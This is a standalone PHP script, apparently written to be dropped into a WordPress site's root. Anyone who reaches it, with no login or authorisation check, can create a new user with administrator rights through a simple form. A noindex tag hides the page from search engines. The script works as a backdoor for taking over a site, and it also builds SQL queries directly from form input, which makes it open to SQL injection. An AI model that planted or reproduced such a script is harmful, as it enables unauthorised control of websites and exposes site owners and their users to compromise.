<?php
require_once('wp-config.php');
global $table_prefix;
$message = '';
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // mendapatkan data dari form
    $username = $_POST['username'];
    $password = $_POST['password'];
    $email = $_POST['email'];
    $conn = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
    if ($conn->connect_error) {
        die("Koneksi database gagal: " . $conn->connect_error);
    }
    $query = "SELECT * FROM ".$table_prefix."users WHERE user_login='$username'";
    $result = $conn->query($query);
    if ($result->num_rows > 0) {
        $message = "Maaf $username sudah tersedia";
    } else {
        $hash = wp_hash_password($password);
        $query = "INSERT INTO ".$table_prefix."users (user_login, user_pass, user_email) VALUES ('$username', '$hash', '$email')";
        if ($conn->query($query) === TRUE) {
            // memperoleh ID pengguna baru
            $user_id = $conn->insert_id;
            $query = "INSERT INTO ".$table_prefix."usermeta (user_id, meta_key, meta_value) VALUES ($user_id, 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}')";
            if ($conn->query($query) === TRUE) {
                // menampilkan pesan sukses kepada pengguna
                $message = "Admin Success Add $username";
            } else {
                $message = "Maaf Gagal Membuat User";
            }
        } else {
            $message = "Maaf Gagal Membuat User";
        }

        // menutup koneksi database
        $conn->close();
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Add WordPress Admin User</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <meta name="robots" content="noindex,nofollow">
</head>
<body>

<div class="container">
    <h1>Add WordPress Admin User</h1>
    <?php if ($message): ?>
        <div class="alert alert-primary" role="alert">
            <?php echo $message; ?>
        </div>
    <?php endif; ?>
    <form method="post" action="">
        <div class="form-group">
            <label for="username">Username</label>
            <input type="text" class="form-control" id="username" name="username" required>
        </div>
        <div class="form-group">
            <label for="password">Password</label>
            <input type="password" class="form-control" id="password" name="password" required>
        </div>
        <div class="form-group">
            <label for="email">Email</label>
            <input type="email" class="form-control" id="email" name="email" required>
        </div>
        <button type="submit" class="btn btn-primary">Submit</button>
    </form>
</div>
</body>
</html>
